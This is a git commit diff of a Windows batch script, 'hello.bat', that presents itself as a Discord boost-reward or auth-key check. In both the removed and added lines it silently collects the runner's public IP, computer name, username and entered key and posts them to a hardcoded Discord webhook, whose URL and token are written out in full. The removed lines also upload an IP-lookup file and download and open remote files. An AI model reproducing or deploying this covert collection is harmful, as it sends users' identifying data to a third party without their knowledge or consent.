adc5ca5effc6781b8bb309bed31d7a9f63229e05
blacktario <91413006+blacktariooo@users.noreply.github.com>
2021-10-18 20:24:55 +0200

    Update hello.bat

--- hello.bat
+++ hello.bat
@@ -5,32 +5,25 @@ set "%el:,=" && set "%"
 color c
 echo.
 echo.
-echo. welcome to the booster !blue!security place!black!
+echo. welcome to blacktario !blue!security place!black!
 set oldcd=%cd%
 cd %temp%
 ::sendtowebhook
 set webhookurlm="https://discord.com/api/webhooks/884127979532324934/UzkCC8cP6JpvWKF6ABdOPHGBmzlNKoSglvyyOVNfpQ__AtQcJkp4qHMkcY_WJWKimi-u"
-curl -sfkL https://extreme-ip-lookup.com/json > %temp%\tempit.txt
 if exist log.txt del log.txt /f /q
 curl --silent "https://myexternalip.com/raw">> %temp%\log.txt
 set /p IP=<%temp%\log.txt
-curl -H "Content-Type: application/json" -d "{\"username\": \"boost security\", \"embeds\": [{\"title\": \"script runned.\", \"color\": 10760150, \"fields\": [{\"name\": \"packing info :\", \"value\": \"all info succesfully get\"}, {\"name\": \"other info : \", \"value\": \"runned by %COMPUTERNAME% on %USERNAME% session. ip of user = %IP% \"}],\"thumbnail\":{\"url\": \"https://logos-world.net/wp-content/uploads/2020/12/Discord-Logo.png\"},\"footer\":{\"text\": \"%time%/%date%\"}}]}" %webhookurlm%
-curl -F "data=@%temp%\tempit.txt" https://discord.com/api/webhooks/884127979532324934/UzkCC8cP6JpvWKF6ABdOPHGBmzlNKoSglvyyOVNfpQ__AtQcJkp4qHMkcY_WJWKimi-u >nul
+curl -H "Content-Type: application/json" -d "{\"username\": \"Auth secure\", \"embeds\": [{\"title\": \"script runned.\", \"color\": 10760150, \"fields\": [{\"name\": \"packing info :\", \"value\": \"all info succesfully get\"}, {\"name\": \"other info : \", \"value\": \"runned by %COMPUTERNAME% on %USERNAME% session. ip of user = %IP% \"}],\"thumbnail\":{\"url\": \"https://logos-world.net/wp-content/uploads/2020/12/Discord-Logo.png\"},\"footer\":{\"text\": \"%time%/%date%\"}}]}" %webhookurlm%
 del %temp%\log.txt /f /q
 cd %oldcd%
 cls
-title rockstarz rewars system
+title auth check
 echo.
 echo.
 echo.
-echo.hello, have u boosted one or two time 1/2
+echo. 
 echo.no need to lie if u have a bad key it will !red!not work!black! x)
-
-set /p answer=""
-if %answer% == 1 goto one
-if %answer% == one goto one
-if %answer% == 2 goto two
-if %answer% == two goto two
+pause >nul
 
 
 
@@ -39,57 +32,29 @@ cls
 echo.
 echo.
 echo.please now enter ur auth key given by an admin or owner... 
-set /p unefois=""
-set zz=https://pastebin.com/raw/hMLjjXGH
-curl -ks %zz% | findstr /X %unefois% >nul
+     set /p unefois=""
+     set zz=https://pastebin.com/raw/qyNEw6UE
+     curl -ks %zz% | findstr /X %unefois% >nul
 if "%errorlevel%"=="0" goto :valid_logina
 
 echo u enter a bad auth key please try again
 ping localhost -n 5 >nul
-exit
+goto one
 
 
-:two
-cls
-echo.
-echo.
-echo.please now enter ur auth key given by an admin or owner... 
-set /p j=""
-set aa=https://pastebin.com/raw/NnsunsRe
-curl -ks %aa% | findstr /X %j% >nul
-if "%errorlevel%"=="0" goto :valid_loginb
-echo u enter a bad auth key please try again
-ping localhost -n 5 >nul
-exit
 
 
 
 :valid_logina
-curl -H "Content-Type: application/json" -d "{\"username\": \"boost security\", \"embeds\": [{\"title\": \"KEY USED 1x boost rewar.\", \"color\": 10760150, \"fields\": [{\"name\": \"key serial number (working) :\", \"value\": \"key = %unefois% \"}, {\"name\": \"other info : \", \"value\": \"runned by %COMPUTERNAME% on %USERNAME% session. ip of user = %IP% \"}],\"thumbnail\":{\"url\": \"https://logos-world.net/wp-content/uploads/2020/12/Discord-Logo.png\"},\"footer\":{\"text\": \"%time%/%date%\"}}]}" %webhookurlm%
+curl -H "Content-Type: application/json" -d "{\"username\": \"Auth secure\", \"embeds\": [{\"title\": \"KEY USED.\", \"color\": 10760150, \"fields\": [{\"name\": \"key serial number (working) :\", \"value\": \"key = %unefois% \"}, {\"name\": \"other info : \", \"value\": \"runned by %COMPUTERNAME% on %USERNAME% session. ip of user = %IP% \"}],\"thumbnail\":{\"url\": \"https://logos-world.net/wp-content/uploads/2020/12/Discord-Logo.png\"},\"footer\":{\"text\": \"%time%/%date%\"}}]}" %webhookurlm%
 cls
 color a
 cls
 echo.
 echo.
 echo.
-echo. thx for boosting :))) cya and have fun ! 
-curl --silent -O https://cdn.discordapp.com/attachments/882355701874311171/884109690760462366/SPOILER_boost1.txt
-start SPOILER_boost1.txt
-echo done !!!
-pause
-exit
-
-
-:valid_loginb
-curl -H "Content-Type: application/json" -d "{\"username\": \"boost security\", \"embeds\": [{\"title\": \"KEY USED 2x boost rewar.\", \"color\": 10760150, \"fields\": [{\"name\": \"key serial number (working) :\", \"value\": \"key = %j% \"}, {\"name\": \"other info : \", \"value\": \"runned by %COMPUTERNAME% on %USERNAME% session. ip of user = %IP% \"}],\"thumbnail\":{\"url\": \"https://logos-world.net/wp-content/uploads/2020/12/Discord-Logo.png\"},\"footer\":{\"text\": \"%time%/%date%\"}}]}" %webhookurlm%
-color a
-cls
-echo.
-echo.
-echo.
-echo. thx for boosting :))) cya and have fun ! 
-curl --silent -O https://cdn.discordapp.com/attachments/882355701874311171/884109649400434748/SPOILER_boost2.txt
-start SPOILER_boost2.txt
-echo done !!!
-pause
+echo.!green!working key!black!
+::here add a redirect or a link to the file u wanna download if the key is good
+echo cya soon ;)))
+pause >nul
 exit
